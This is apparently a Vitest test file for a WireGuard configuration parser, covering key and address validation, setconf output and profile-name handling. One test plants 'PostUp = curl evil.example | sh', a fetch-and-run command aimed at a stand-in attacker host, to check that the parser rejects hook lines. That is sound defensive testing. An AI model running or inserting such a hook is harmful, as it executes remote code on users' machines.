import { describe, expect, it } from "vitest";
import {
  isValidProfileName,
  parseWireguardConfig,
  summarizeWireguard,
  toProfileName,
  toSetconf,
} from "../src/wireguard.ts";

// Throwaway, syntactically valid keys (not real credentials).
const PRIVATE = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=";
const PUBLIC = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=";
const PSK = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";

const VALID = `
# provider profile
[Interface]
PrivateKey = ${PRIVATE}
Address = 10.13.13.2/32, fd00::2/128
DNS = 1.1.1.1
MTU = 1420
ListenPort = 51820

[Peer]
PublicKey = ${PUBLIC}
PresharedKey = ${PSK}
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 15
`;

describe("parseWireguardConfig", () => {
  it("parses a typical provider profile", () => {
    const result = parseWireguardConfig(VALID);
    expect(result.ok).toBe(true);
    if (!result.ok) {
      return;
    }
    expect(result.config.iface).toEqual({
      privateKey: PRIVATE,
      addresses: ["10.13.13.2/32", "fd00::2/128"],
      dns: ["1.1.1.1"],
      mtu: 1420,
    });
    expect(result.config.peers).toEqual([
      {
        publicKey: PUBLIC,
        presharedKey: PSK,
        endpoint: "vpn.example.com:51820",
        allowedIps: ["0.0.0.0/0", "::/0"],
        persistentKeepalive: 15,
      },
    ]);
    expect(summarizeWireguard(result.config)).toEqual({
      endpoint: "vpn.example.com:51820",
      addresses: ["10.13.13.2/32", "fd00::2/128"],
    });
  });

  it("rejects wg-quick hooks, which the gateway never runs", () => {
    const result = parseWireguardConfig(VALID.replace("MTU = 1420", "PostUp = curl evil.example | sh"));
    expect(result).toEqual({ ok: false, errors: [expect.stringContaining('"postup" hooks are not supported')] });
  });

  it("reports every problem it finds", () => {
    const result = parseWireguardConfig(
      "[Interface]\nPrivateKey = nope\nAddress = 300.1.1.1/32\n[Peer]\nEndpoint = no-port\nFoo = bar\n",
    );
    expect(result.ok).toBe(false);
    if (result.ok) {
      return;
    }
    expect(result.errors).toEqual(
      expect.arrayContaining([
        expect.stringContaining("PrivateKey is not a valid WireGuard key"),
        expect.stringContaining('invalid Address "300.1.1.1/32"'),
        expect.stringContaining("Endpoint must look like host:port"),
        expect.stringContaining('unknown [Peer] key "foo"'),
        expect.stringContaining("is missing PublicKey"),
      ]),
    );
  });

  it("needs exactly one interface, a peer and an IPv4 address", () => {
    expect(parseWireguardConfig("")).toMatchObject({ ok: false });
    const ipv6Only = VALID.replace("10.13.13.2/32, ", "");
    expect(parseWireguardConfig(ipv6Only)).toEqual({
      ok: false,
      errors: ["[Interface] needs at least one IPv4 Address"],
    });
  });
});

describe("toSetconf", () => {
  it("keeps only what wg setconf accepts and defaults keepalive", () => {
    const result = parseWireguardConfig(VALID.replace("PersistentKeepalive = 15", ""));
    if (!result.ok) {
      throw new Error(result.errors.join("; "));
    }
    const text = toSetconf(result.config);
    expect(text).toContain(`PrivateKey = ${PRIVATE}`);
    expect(text).toContain("PersistentKeepalive = 25");
    expect(text).not.toMatch(/Address|DNS|MTU|ListenPort/);
  });
});

describe("profile names", () => {
  it("validates and derives names", () => {
    expect(isValidProfileName("mullvad-se_1")).toBe(true);
    expect(isValidProfileName("Bad Name")).toBe(false);
    expect(toProfileName("My VPN (Sweden).conf")).toBe("my-vpn-sweden");
    expect(toProfileName("???")).toBe("profile");
    expect(toProfileName("x".repeat(40))).toHaveLength(32);
  });
});
